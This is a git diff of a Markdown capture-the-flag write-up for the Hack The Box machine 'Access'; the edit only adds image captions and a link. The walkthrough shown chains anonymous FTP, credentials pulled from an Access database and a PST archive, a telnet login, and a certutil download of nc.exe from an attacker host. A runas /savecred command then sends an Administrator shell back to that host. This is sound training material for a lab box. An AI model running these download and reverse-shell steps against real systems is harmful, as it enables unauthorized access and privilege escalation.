@@ -12,7 +12,7 @@ image:
 
 ## Summary
 
-Access is a straightforward Windows machine centered on identifying and connecting small leaks across multiple open services. The entry point involves **anonymous FTP** access to retrieve a ZIP archive and a **Microsoft Access database**. Extracting credentials from a discovered **Outlook .pst email** archive provides initial access via Telnet. For privilege escalation, the presence of stored credentials in the **Windows Credential Manager** allows for the abuse of the `runas /savecred` feature to execute commands as the Administrator.
+[Access](https://www.hackthebox.com/machines/access){: target="_blank" } is a straightforward Windows machine centered on identifying and connecting small leaks across multiple open services. The entry point involves **anonymous FTP** access to retrieve a ZIP archive and a **Microsoft Access database**. Extracting credentials from a discovered **Outlook .pst email** archive provides initial access via Telnet. For privilege escalation, the presence of stored credentials in the **Windows Credential Manager** allows for the abuse of the `runas /savecred` feature to execute commands as the Administrator.
 
 ## Port Scanning
 
@@ -23,6 +23,7 @@ nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.13.41 -oN allports
 ```
 
 ![Description: ](image_1.webp)
+_Open TCP Ports_
 
 ## Service Detection
 
@@ -33,6 +34,7 @@ nmap -p21,23,80 -sCV 10.129.13.41 -oN services
 ```
 
 ![Description: ](image_2.webp)
+_FTP Anonymous allowed_
 
 ### Port 80 Basic Enum
 
@@ -54,12 +56,14 @@ Content-Length: 391
 ```
 
 ![Description: ](image_3.webp)
+_Web Server_
 
 ## Port 21 - FTP Anon
 
 Since **anonymous** login is allowed, we will dig into this service:
 
 ![Description: ](image_4.webp)
+_Access to FTP_
 
 In **Backups** there is a `.mdb` file that we downloaded to check in our system.
 
@@ -67,18 +71,22 @@ In **Backups** there is a `.mdb` file that we downloaded to check in our system.
 {: .prompt-info }
 
 ![Description: ](image_5.webp)
+_Downloading files_
 
 Also in the **Engineer** folder we have a `zip` file that we will transfer to our kali.
 
 ![Description: ](image_6.webp)
+_Downloading files_
 
 ## Shell as Security
 
 The files downloaded from ftp seem interesting. First we have a **Microsoft Access Database** and a `zip` protected via password that contains a [.pst](https://support.microsoft.com/en-us/office/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790){:target="_blank"} file.
 
 ![Description: ](image_7.webp)
+_Microsoft Access Database_
 
 ![Description: ](image_8.webp)
+_PST file_
 
 ### Extracting Data from Access DB
 
@@ -89,6 +97,7 @@ mdb-tables backup.mdb | grep auth
 ```
 
 ![Description: ](image_9.webp)
+_Dumping info from Access DB_
 
 To read the content of a table we have to run the following command:
 
@@ -97,10 +106,12 @@ mdb-export backup.mdb auth_user
 ```
 
 ![Description: ](image_10.webp)
+_Credentials on auth_user table_
 
 We got some credentials, so now we can test if one works for the zip file:
 
 ![Description: ](image_11.webp)
+_Extracting files with 7z_
 
 >**Zip Password**
 >
@@ -118,19 +129,24 @@ cat Access\ Control.mbox | grep security
 ```
 
 ![Description: ](image_12.webp)
+_Creds found on PST file_
 
 > You can also use online tools to read those files as shown below.
 {: .prompt-warning }
 
 ![Description: ](image_13.webp)
+_mdb online reader_
 
 ![Description: ](image_14.webp)
+_pst online reader_
 
 We found a credential so we can check if it works to log in via `telnet`:
 
 ![Description: ](image_15.webp)
+_Access via telnet_
 
 ![Description: ](image_16.webp)
+_Link file_
 
 >**Telnet Credentials**
 >
@@ -146,6 +162,7 @@ C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
 ```
 
 ![Description: ](image_17.webp)
+_Stored creds found_
 
 If you want to validate the stored credential, you could use `cmdkey` as show below:
 
@@ -154,6 +171,7 @@ cmdkey /list
 ```
 
 ![Description: ](image_18.webp)
+_Using cmdkey to validate_
 
 To gain an interactive shell as Administrator abusing this stored credential, we have to transfer `nc.exe` to the target box:
 
@@ -162,8 +180,10 @@ certutil.exe -f -split -urlcache http://10.10.15.41/nc.exe nc.exe
 ```
 
 ![Description: ](image_19.webp)
+_Python http.server_
 
 ![Description: ](image_20.webp)
+_Using certutil to download nc_
 
 Now we will use `runas.exe` to execute `nc.exe` so we can send us a **cmd** to our machine. This will give us a shell as administrator because we are going to use `/savecred` to use that stored credential.
 
@@ -172,8 +192,10 @@ C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\T
 ```
 
 ![Description: ](image_21.webp)
+_Using runas.exe_
 
 ![Description: ](image_22.webp)
+_Shell as system_
 
 ## Flags
 
